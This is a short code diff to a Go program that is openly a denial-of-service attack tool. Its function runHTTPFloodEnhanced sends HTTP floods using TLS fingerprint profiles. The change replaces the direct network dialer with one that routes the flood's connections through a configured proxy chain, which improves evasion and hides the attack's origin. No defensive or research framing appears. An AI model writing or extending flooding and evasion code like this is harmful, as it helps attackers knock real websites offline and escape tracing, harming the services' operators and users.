@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"io"
 	"log"
-	"net"
 	"net/http"
 	"net/url"
 	"strconv"
@@ -104,12 +103,13 @@ func runHTTPFloodEnhanced(cfg *AttackConfig) {
 		// Create custom transport with TLS fingerprinting
 		tlsConfig := CreateTLSConfig(profile, parsedTarget.Hostname())
 		
+		dialContext := createDialerWithKeepAlive(cfg.ProxyChain,
+			time.Duration(cfg.Timeout)*time.Second,
+			time.Duration(cfg.KeepAlive)*time.Second)
+
 		transport := &http.Transport{
 			TLSClientConfig: tlsConfig,
-			DialContext: (&net.Dialer{
-				Timeout:   time.Duration(cfg.Timeout) * time.Second,
-				KeepAlive: time.Duration(cfg.KeepAlive) * time.Second,
-			}).DialContext,
+			DialContext:     dialContext,
 			MaxIdleConns:          100,
 			MaxIdleConnsPerHost:   10,
 			IdleConnTimeout:       90 * time.Second,
